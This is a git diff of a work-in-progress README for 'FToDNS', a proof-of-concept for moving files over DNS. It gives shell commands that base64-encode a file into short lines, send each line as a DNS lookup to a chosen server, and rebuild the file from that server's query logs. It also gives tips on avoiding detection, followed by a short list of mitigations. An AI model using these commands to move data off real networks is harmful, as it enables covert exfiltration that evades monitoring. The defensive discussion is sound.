@@ -1,6 +1,8 @@
 # FToDNS: File Transfer over Domain Name Service
 Christopher Neitzert <chris@neitzert.com>
 
+**This is a _Work in Progress_**
+
 ---
 
 ## What:
@@ -33,11 +35,11 @@ Given the multitude of ways DNS can be integrated into an infrastructure and the
 
 
 ### Types
+The three types of system operating within this PoC:
 ![TYPES of System](/images/FToDNS_Types.png)
-* The three types of system operating within this PoC.
-* Authoritative DNS Server:  A DNS server that behaves as though it is an authoritative resource of Domain Name information.
-* Recursive DNS Server: A DNS server that is not an authoritative resource of Domain Name infomration, but retreives it for the DNS Client.
-* DNS Client: The resolver that queries the Domain Name Service to resolve addresses.
+1. Authoritative DNS Server:  A DNS server that behaves as though it is an authoritative resource of Domain Name information.
+2. Recursive DNS Server: A DNS server that is not an authoritative resource of Domain Name infomration, but retreives it for the DNS Client.
+3. DNS Client: The resolver that queries the Domain Name Service to resolve addresses.
  
 ### Landscape:
 Two types of Landscape that DNS servers exists in, 'Direct Client to Server' and 'Client to Recursive Server to Authoritative' (AKA: Recursive). 
@@ -62,12 +64,14 @@ From the perspective of bad actor in the PoC the a recursive landscape contains 
 
 
 ### Verbs
-* The two 'Verbs' that happen in a basic file transfer; We will call them 'Put File' and 'Get file'. 
-* Where to put a file is to copy towards and to get a file is to copy from other systems.
+The two 'Verbs' that happen in a basic file transfer; We will call them 'Put File' and 'Get file'. 
+Where 'to put' a file is to copy towards and 'to get' a file is to copy from other systems.
 
 #### Put File
 ![DNS](/images/FToDNS_PutFile.png)
 * The user chooses a file and Base64 encodes the file with 56 Byte long lines
+	* 56 Byte long lines are chosen due to the maxium size of a DNS CNAME(63 bytes)
+	* 
 	* One consideration is a multiple encoding method to correct for out of order query-server-log issues.
 		* ex: 
 			* base64 -w56 $FILE | cat -n | base64 -w56 > file_to_be_put
@@ -76,13 +80,10 @@ From the perspective of bad actor in the PoC the a recursive landscape contains 
 			* host -6 -a -W60 $line.io 2001:db8:1:1:1:1:1:1 
 		* Detection avoidance considerations should be taken around timing, encoding, destination servers, and host call.
 	* The query is not required to exist on the Authoritative DNS server to be logged at the Authoritative DNS server. 
-		* ex: 
-			* cat $NAMED_LOGFILE | grep .io | grep cache | cut -f2 -d"("| cut -f1 -d"." | base64 -d > $DESIRED_FILE_OUTPUT
 	* Each query is logged by the destination DNS Server and easily extracted by the inverse method of it's encoding.
 		* ex: 
 			* cat $NAMED_LOGFILE | grep .io | grep cache | cut -f2 -d"("| cut -f1 -d"." | base64 -d > $DESIRED_FILE_OUTPUT
  
-
 
 
 #### Get File
@@ -143,19 +144,26 @@ From the perspective of bad actor in the PoC the a recursive landscape contains 
 This specific Proof of Concept creates several issues with its issuance and this document would not be complete without a short discussion on mitigation.
 
 1. Network
-	1. Limit Talkers
 	1. Record DNS 'meta data'
+	1. Limit 'top talkers' 
+	1. Network limits on DNS resolutions per minute
 	1. 
 	
-1. DNS Server Architecture
-	1. Restrict zone transfers 
+1. DNS Server Architecture & Configuration
+	1. Restrict zone transfers (by default iirc)
+	1. Disable zone transfer within recursive servers
 	1. Disable recursive checks and retrievals.	
+	1. 
+	1. 
 	
 1. Fuzzing
 	1. Timing and Frequency
 	1. Query length
 	1. Text Encoding
-	1. 
+		1. Text format/encipherment
+		1. Chop length
+		1. Line numbering
+		1. 
 
 ---
 
